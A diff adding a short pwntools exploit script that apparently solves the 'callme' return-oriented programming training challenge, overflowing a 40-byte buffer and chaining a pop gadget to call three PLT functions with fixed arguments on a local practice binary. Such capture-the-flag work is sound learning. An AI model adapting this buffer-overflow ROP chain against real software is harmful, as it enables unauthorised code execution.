@@ -1,0 +1,30 @@
+#!/usr/bin/python3
+from pwn import *
+
+p = process('./callme')
+arg1 = 0xdeadbeefdeadbeef
+arg2 = 0xcafebabecafebabe
+arg3 = 0xd00df00dd00df00d
+elf = ELF('./callme')
+callme_one = elf.plt['callme_one']
+callme_two = elf.plt['callme_two']
+callme_three = elf.plt['callme_three']
+pop_rdi_rsi_rdx = 0x40093c
+rop = b"A"*40
+rop += p64(pop_rdi_rsi_rdx)
+rop += p64(arg1)
+rop += p64(arg2)
+rop += p64(arg3)
+rop += p64(callme_one)
+rop += p64(pop_rdi_rsi_rdx)
+rop += p64(arg1)
+rop += p64(arg2)
+rop += p64(arg3)
+rop += p64(callme_two)
+rop += p64(pop_rdi_rsi_rdx)
+rop += p64(arg1)
+rop += p64(arg2)
+rop += p64(arg3)
+rop += p64(callme_three)
+p.sendlineafter(b'>', rop)
+p.interactive()
